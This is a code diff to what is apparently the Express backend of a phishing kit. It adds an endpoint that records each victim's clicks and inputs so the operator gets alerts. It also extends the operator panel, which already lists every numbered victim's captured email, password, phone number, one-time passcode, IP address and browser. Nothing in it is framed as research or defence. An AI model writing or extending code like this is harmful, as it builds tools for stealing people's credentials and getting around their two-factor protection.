@@ -139,7 +139,8 @@ app.post('/api/session', async (req, res) => {
       platform: uaParser(ua).os?.name || 'n/a',
       browser: uaParser(ua).browser?.name || 'n/a',
       attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
-      status: 'loaded', victimNum: victimCounter
+      status: 'loaded', victimNum: victimCounter,
+      interactions: []
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
@@ -258,6 +259,21 @@ app.post('/api/clearOk', (req, res) => {
   res.sendStatus(200);
 });
 
+/*  interaction tracking for alerts  */
+app.post('/api/interaction', (req, res) => {
+  const { sid, type, data } = req.body;
+  if (!sessionsMap.has(sid)) return res.sendStatus(404);
+  const v = sessionsMap.get(sid);
+  
+  // Store interaction timestamp
+  v.lastInteraction = Date.now();
+  v.interactions = v.interactions || [];
+  v.interactions.push({ type, data, time: Date.now() });
+  
+  sessionActivity.set(sid, Date.now());
+  res.sendStatus(200);
+});
+
 /* ----------  WEB PANEL API  ---------- */
 
 /*  panel data  */
@@ -265,7 +281,8 @@ app.get('/api/panel', (req, res) => {
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
-    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr
+    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
+    entered: v.entered, unregisterClicked: v.unregisterClicked
   }));
   res.json({
     domain: currentDomain,               // always fresh
